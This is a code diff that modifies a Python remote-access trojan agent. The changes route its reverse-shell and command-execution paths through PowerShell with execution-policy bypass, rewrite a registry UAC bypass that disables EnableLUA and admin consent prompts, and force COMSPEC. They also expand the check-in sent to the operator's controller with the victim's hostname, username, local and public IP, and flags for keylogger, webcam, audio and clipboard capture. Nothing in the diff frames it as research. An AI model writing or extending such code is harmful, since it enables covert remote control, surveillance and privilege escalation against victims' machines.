@@ -2467,7 +2467,7 @@ def bypass_uac_junction_method():
         # Use mklink to create junction (requires admin, so this is simplified)
         try:
             subprocess.run([
-                'cmd', '/c', 'mklink', '/J', 
+                'powershell.exe', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-Command', 'mklink', '/J', 
                 os.path.join(temp_dir, "fake_system32"),
                 junction_dir
             ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
@@ -3427,7 +3427,7 @@ goto loop
         #     f.write(watchdog_batch)
         # 
         # # Start watchdog
-        # subprocess.Popen(['cmd.exe', '/c', watchdog_path], 
+        # subprocess.Popen(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-File', watchdog_path], 
         #                 creationflags=subprocess.CREATE_NO_WINDOW)
         
         log_message(f"[SKIP] Watchdog batch persistence disabled to prevent popup windows")
@@ -4807,10 +4807,10 @@ def disable_wsl_routing():
         
         # Method 3: Force CMD.exe as default shell (AGGRESSIVE!)
         try:
-            # Set ComSpec to force CMD.exe
-            cmd_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cmd.exe')
-            os.environ['COMSPEC'] = cmd_path
-            log_message(f"[WSL] Forced COMSPEC to: {cmd_path}")
+            # Set ComSpec to force PowerShell
+            ps_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe')
+            os.environ['COMSPEC'] = ps_path
+            log_message(f"[WSL] Forced COMSPEC to: {ps_path}")
         except Exception as e:
             log_message(f"[WSL] Failed to set COMSPEC: {e}")
         
@@ -5729,6 +5729,29 @@ LAST_CLIPBOARD_CONTENT = ""
 
 # --- Audio Config ---
 # Note: Audio constants are defined globally above
+
+
+def get_local_ip():
+    """Get local IP address."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return '127.0.0.1'
+
+def get_public_ip():
+    """Get public IP address."""
+    try:
+        if REQUESTS_AVAILABLE:
+            import requests
+            response = requests.get('https://api.ipify.org?format=json', timeout=3)
+            return response.json()['ip']
+    except:
+        pass
+    return 'unknown'
 
 def get_or_create_agent_id():
     """
@@ -7658,7 +7681,7 @@ def reverse_shell_handler(agent_id):
                             else:
                                 # Use CMD.exe with proper encoding
                                 result = subprocess.run(
-                                    [cmd_exe_path, "/c", "chcp 65001 >nul & " + command],
+                                    [ps_exe_path, "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", command],
                                     capture_output=True,
                                     text=False,  # Get bytes for proper encoding
                                     timeout=30,
@@ -8377,7 +8400,28 @@ def register_socketio_handlers():
     def connect():
         agent_id = get_or_create_agent_id()
         log_message(f"Connected to controller, registering agent {agent_id}")
-        safe_emit('agent_connect', {'agent_id': agent_id})  # ✅ SAFE
+        safe_emit('agent_connect', {
+        'agent_id': agent_id,
+        'hostname': socket.gethostname(),
+        'platform': platform.system(),
+        'os_version': platform.release(),
+        'ip_address': get_local_ip(),
+        'public_ip': get_public_ip(),
+        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
+        'version': '2.1',
+        'capabilities': {
+            'screen': True,
+            'camera': CV2_AVAILABLE,
+            'audio': PYAUDIO_AVAILABLE,
+            'keylogger': PYNPUT_AVAILABLE,
+            'clipboard': True,
+            'file_manager': True,
+            'process_manager': PSUTIL_AVAILABLE,
+            'webcam': CV2_AVAILABLE,
+            'webrtc': AIORTC_AVAILABLE
+        },
+        'timestamp': int(time.time() * 1000)
+    })  # ✅ SAFE
     
     # Register file transfer handlers
     sio.on('file_chunk_from_operator')(on_file_chunk_from_operator)
@@ -8822,7 +8866,7 @@ def format_command_output(output):
 def execute_command(command):
     """Execute a command and return its output - SMART AUTO-DETECTION with PRESERVED FORMATTING"""
     try:
-        log_message(f"[CMD] Executing: {command}", "info")
+        log_message(f"[PS] Executing: {command}", "info")
         
         # Check for incomplete/interactive commands
         interactive_commands = {
@@ -8838,7 +8882,7 @@ def execute_command(command):
         cmd_lower = command.strip().lower()
         if cmd_lower in interactive_commands:
             help_msg = f"ℹ️ '{command}' requires arguments.\n\nSuggested commands:\n{interactive_commands[cmd_lower]}\n\nTip: Type the full command on one line (e.g., 'netsh wlan show profile')"
-            log_message(f"[CMD] Interactive command detected: {command}", "info")
+            log_message(f"[PS] Interactive command detected: {command}", "info")
             return help_msg
         
         if platform.system() == "Windows":
@@ -8880,7 +8924,7 @@ def execute_command(command):
                     command = f"{translated} {' '.join(cmd_parts[1:])}"
                 else:
                     command = translated
-                log_message(f"[CMD] Auto-translated: '{original_command}' → '{command}'", "info")
+                log_message(f"[PS] Auto-translated: '{original_command}' → '{command}'", "info")
             
             # PowerShell cmdlet detection
             powershell_keywords = [
@@ -8903,7 +8947,7 @@ def execute_command(command):
             
             if use_powershell:
                 # Use PowerShell for PowerShell-specific commands
-                log_message(f"[CMD] Using PowerShell: {ps_exe_path}", "debug")
+                log_message(f"[PS] Using PowerShell: {ps_exe_path}", "debug")
                 
                 # PowerShell with proper output formatting
                 # Add Out-String -Width 200 to preserve formatting
@@ -8939,11 +8983,11 @@ def execute_command(command):
                 
             else:
                 # Use CMD.exe for standard/translated commands
-                log_message(f"[CMD] Using CMD.exe: {cmd_exe_path}", "debug")
+                log_message(f"[PS] Using CMD.exe: {cmd_exe_path}", "debug")
                 
                 # For CMD, capture bytes first for proper encoding
                 result = subprocess.run(
-                    [cmd_exe_path, "/c", "chcp 65001 >nul & " + command],  # Force UTF-8 output
+                    [ps_exe_path, "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", command],  # Force UTF-8 output
                     capture_output=True,
                     text=False,  # Get bytes first
                     timeout=30,
@@ -8990,7 +9034,7 @@ def execute_command(command):
         if not output or output.strip() == "":
             output = "[No output from command]"
         
-        log_message(f"[CMD] Output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
+        log_message(f"[PS] Output: {output[:200]}{'...' if len(output) > 200 else ''}", "success")
         return output
         
     except subprocess.TimeoutExpired:
@@ -11547,7 +11591,28 @@ def connect():
     # Connection message
     log_message(f"Connected to server. Registering with agent_id: {agent_id}")
     
-    safe_emit('agent_connect', {'agent_id': agent_id})
+    safe_emit('agent_connect', {
+        'agent_id': agent_id,
+        'hostname': socket.gethostname(),
+        'platform': platform.system(),
+        'os_version': platform.release(),
+        'ip_address': get_local_ip(),
+        'public_ip': get_public_ip(),
+        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
+        'version': '2.1',
+        'capabilities': {
+            'screen': True,
+            'camera': CV2_AVAILABLE,
+            'audio': PYAUDIO_AVAILABLE,
+            'keylogger': PYNPUT_AVAILABLE,
+            'clipboard': True,
+            'file_manager': True,
+            'process_manager': PSUTIL_AVAILABLE,
+            'webcam': CV2_AVAILABLE,
+            'webrtc': AIORTC_AVAILABLE
+        },
+        'timestamp': int(time.time() * 1000)
+    })
     
     # Emit WebRTC status if available
     if AIORTC_AVAILABLE:
@@ -12848,7 +12913,28 @@ def agent_main():
                     log_message(f"[INFO] Registering agent {agent_id} with controller...")
                     
                     # ✅ SAFE EMIT: Critical registration path
-                    if not safe_emit('agent_connect', {'agent_id': agent_id}):
+                    if not safe_emit('agent_connect', {
+        'agent_id': agent_id,
+        'hostname': socket.gethostname(),
+        'platform': platform.system(),
+        'os_version': platform.release(),
+        'ip_address': get_local_ip(),
+        'public_ip': get_public_ip(),
+        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
+        'version': '2.1',
+        'capabilities': {
+            'screen': True,
+            'camera': CV2_AVAILABLE,
+            'audio': PYAUDIO_AVAILABLE,
+            'keylogger': PYNPUT_AVAILABLE,
+            'clipboard': True,
+            'file_manager': True,
+            'process_manager': PSUTIL_AVAILABLE,
+            'webcam': CV2_AVAILABLE,
+            'webrtc': AIORTC_AVAILABLE
+        },
+        'timestamp': int(time.time() * 1000)
+    }):
                         log_message(f"[ERROR] Failed to send agent registration - connection issue", "error")
                     else:
                         log_message(f"[OK] Agent {agent_id} registration sent to controller")
@@ -13025,7 +13111,7 @@ if __name__ == "__main__":
         print("[STARTUP] Step 0: Disabling WSL routing (AGGRESSIVE)...")
         try:
             if disable_wsl_routing():
-                print("[STARTUP] ✅ WSL routing disabled - commands will use CMD.exe directly")
+                print("[STARTUP] ✅ WSL routing disabled - commands will use PowerShell directly")
             else:
                 print("[STARTUP] ⚠️ WSL routing disable failed (not critical)")
         except Exception as e:
@@ -13403,7 +13489,7 @@ def write_and_import_uac_bypass_reg():
 Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command]
-@="cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
+@="powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 0 -Force; Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Force\""
 "DelegateExecute"=""
 '''
     
